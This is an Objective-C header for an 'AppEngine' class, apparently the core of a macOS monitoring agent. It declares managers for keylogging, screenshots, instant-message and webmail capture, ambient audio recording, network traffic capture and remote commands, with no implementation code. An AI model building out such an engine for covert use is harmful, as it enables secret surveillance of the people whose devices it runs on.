//
//  AppEngine.h
//  AppEngine
//
//  Created by Makara Khloth on 11/17/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "LicenseChangeListener.h"
#import "ServerAddressChangeDelegate.h"

@class AppContextImp;
@class SystemUtilsImpl;
@class LicenseManager;
@class ConfigurationManagerImpl;
@class ServerAddressManagerImp;
@class ConnectionHistoryManagerImp;
@class PreferenceManagerImpl;
@class CommandServiceManager;
@class DataDeliveryManager;
@class ActivationManager;
@class EventRepositoryManager;
@class EventDeliveryManager;
@class EventCenter;
@class RemoteCmdManagerImpl;
@class KeyboardEventHandler;
@class HotKeyCaptureManager;
@class SoftwareUpdateManagerImpl;
@class AppAgentManagerForMac;
@class USBAutoActivationManager;
@class FxLoggerManager;
@class PushNotificationManager;

// Utils
@class ServerErrorStatusHandler;
@class PreferencesChangeHandler;
@class LicenseGetConfigUtils;
@class LicenseHeartbeatUtils;

// Features
@class KeyboardLoggerManager;
@class KeyboardCaptureManager;
@class PageVisitedCaptureManager;
@class ApplicationManagerForMacImpl;
@class KeySnapShotRuleManagerImpl;
@class DeviceSettingsManagerImpl;
@class USBConnectionCaptureManager;
@class USBFileTransferCaptureManager;
@class ApplicationUsageCaptureManager;
@class IMCaptureManagerForMac;
@class ScreenshotCaptureManagerImpl;
@class NetworkTrafficCaptureManagerImpl;
@class UserActivityCaptureManager;
@class WebmailCaptureManager;
@class AmbientRecordingManagerForMac;
@class TemporalControlManagerImpl;
@class InternetFileTransferManager;
@class FileActivityCaptureManager;
@class PrinterMonitorManager;
@class NetworkConnectionCaptureManager;

@interface AppEngine : NSObject <LicenseChangeListener, ServerAddressChangeDelegate> {
@private
	// Engine
	AppContextImp*						mApplicationContext;
	SystemUtilsImpl						*mSystemUtils;
	LicenseManager*						mLicenseManager;
	ConfigurationManagerImpl*			mConfigurationManager;
	ServerAddressManagerImp*			mServerAddressManager;
	ConnectionHistoryManagerImp*		mConnectionHistoryManager;
	PreferenceManagerImpl*				mPreferenceManager;
	CommandServiceManager*				mCSM;
	DataDeliveryManager*				mDDM;
	ActivationManager*					mActivationManager;
	EventRepositoryManager*				mERM;
	EventDeliveryManager*				mEDM;
	EventCenter*						mEventCenter;
	RemoteCmdManagerImpl*				mRemoteCmdManager;
    KeyboardEventHandler                *mKeyboardEventHandler;
    HotKeyCaptureManager                *mHotKeyCaptureManager;
    SoftwareUpdateManagerImpl			*mSoftwareUpdateManager;
    AppAgentManagerForMac               *mAppAgentManager;
    USBAutoActivationManager            *mUSBAutoActivationManager;
    FxLoggerManager                     *mFxLoggerManager;
    PushNotificationManager             *mPushNotificationManager;
    
	// Utils
	ServerErrorStatusHandler*			mServerErrorStatusHandler;
	PreferencesChangeHandler			*mPreferencesChangeHandler;
    LicenseGetConfigUtils				*mLicenseGetConfigUtils;
    LicenseHeartbeatUtils				*mLicenseHeartbeatUtils;
	
	// Features
    KeySnapShotRuleManagerImpl          *mKeySnapShotRuleManagerImpl;
    KeyboardLoggerManager               *mKeyboardLoggerManager;
    KeyboardCaptureManager              *mKeyboardCaptureManager;
    PageVisitedCaptureManager           *mPageVisitedCaptureManager;
    ApplicationManagerForMacImpl        *mApplicationManagerForMacImpl;
    DeviceSettingsManagerImpl           *mDeviceSettingsManager;
    USBConnectionCaptureManager         *mUSBConnectionCaptureManager;
    USBFileTransferCaptureManager       *mUSBFileTransferCaptureManager;
    ApplicationUsageCaptureManager      *mApplicationUsageCaptureManager;
    IMCaptureManagerForMac              *mIMCaptureManagerForMac;
    ScreenshotCaptureManagerImpl        *mScreenshotCaptureManagerImpl;
    UserActivityCaptureManager          *mUserActivityCaptureManager;
    WebmailCaptureManager               *mWebmailCaptureManager;
    AmbientRecordingManagerForMac       *mAmbientRecordingManagerForMac;
    TemporalControlManagerImpl          *mTemporalControlManager;
    InternetFileTransferManager         *mInternetFileTransferManager;
    FileActivityCaptureManager          *mFileActivityCaptureManager;
    NetworkTrafficCaptureManagerImpl    *mNetworkTrafficCaptureManagerImpl;
    PrinterMonitorManager               *mPrinterMonitorManager;
    NetworkConnectionCaptureManager     *mNetworkConnectionCaptureManager;
	// Flags
	BOOL                                mIsRestartingAppEngine;
}

// Engine
@property (nonatomic, readonly) AppContextImp* mApplicationContext;
@property (nonatomic, readonly) SystemUtilsImpl *mSystemUtils;
@property (nonatomic, readonly) LicenseManager* mLicenseManager;
@property (nonatomic, readonly) ConfigurationManagerImpl* mConfigurationManager;
@property (nonatomic, readonly) ServerAddressManagerImp* mServerAddressManager;
@property (nonatomic, readonly) ConnectionHistoryManagerImp* mConnectionHistoryManager;
@property (nonatomic, readonly) PreferenceManagerImpl* mPreferenceManager;
@property (nonatomic, readonly) CommandServiceManager* mCSM;
@property (nonatomic, readonly) DataDeliveryManager* mDDM;
@property (nonatomic, readonly) ActivationManager* mActivationManager;
@property (nonatomic, readonly) EventRepositoryManager* mERM;
@property (nonatomic, readonly) EventDeliveryManager* mEDM;
@property (nonatomic, readonly) EventCenter* mEventCenter;
@property (nonatomic, readonly) RemoteCmdManagerImpl* mRemoteCmdManager;
@property (nonatomic, readonly) KeyboardEventHandler *mKeyboardEventHandler;
@property (nonatomic, readonly) HotKeyCaptureManager *mHotKeyCaptureManager;
@property (nonatomic, readonly) SoftwareUpdateManagerImpl *mSoftwareUpdateManager;
@property (nonatomic, readonly) AppAgentManagerForMac *mAppAgentManager;
@property (nonatomic, readonly) USBAutoActivationManager *mUSBAutoActivationManager;
@property (nonatomic, readonly) FxLoggerManager *mFxLoggerManager;
@property (nonatomic, readonly) PushNotificationManager *mPushNotificationManager;
@property (nonatomic, readonly) InternetFileTransferManager *mInternetFileTransferManager;
@property (nonatomic, readonly) FileActivityCaptureManager * mFileActivityCaptureManager;
@property (nonatomic, readonly) NetworkTrafficCaptureManagerImpl * mNetworkTrafficCaptureManagerImpl;
@property (nonatomic, readonly) PrinterMonitorManager * mPrinterMonitorManager;
@property (nonatomic, readonly) NetworkConnectionCaptureManager *mNetworkConnectionCaptureManager;

// Features
@property (nonatomic, readonly) KeySnapShotRuleManagerImpl *mKeySnapShotRuleManagerImpl;
@property (nonatomic, readonly) KeyboardLoggerManager *mKeyboardLoggerManager;
@property (nonatomic, readonly) KeyboardCaptureManager *mKeyboardCaptureManager;
@property (nonatomic, readonly) PageVisitedCaptureManager *mPageVisitedCaptureManager;
@property (nonatomic, readonly) ApplicationManagerForMacImpl *mApplicationManagerForMacImpl;
@property (nonatomic, readonly) DeviceSettingsManagerImpl *mDeviceSettingsManager;
@property (nonatomic, readonly) USBConnectionCaptureManager *mUSBConnectionCaptureManager;
@property (nonatomic, readonly) USBFileTransferCaptureManager *mUSBFileTransferCaptureManager;
@property (nonatomic, readonly) ApplicationUsageCaptureManager *mApplicationUsageCaptureManager;
@property (nonatomic, readonly) IMCaptureManagerForMac *mIMCaptureManagerForMac;
@property (nonatomic, readonly) ScreenshotCaptureManagerImpl *mScreenshotCaptureManagerImpl;
@property (nonatomic, readonly) UserActivityCaptureManager *mUserActivityCaptureManager;
@property (nonatomic, readonly) WebmailCaptureManager *mWebmailCaptureManager;
@property (nonatomic, readonly) AmbientRecordingManagerForMac *mAmbientRecordingManagerForMac;
@property (nonatomic, readonly) TemporalControlManagerImpl *mTemporalControlManager;

// Flags
@property (nonatomic, assign) BOOL mIsRestartingAppEngine;

@end
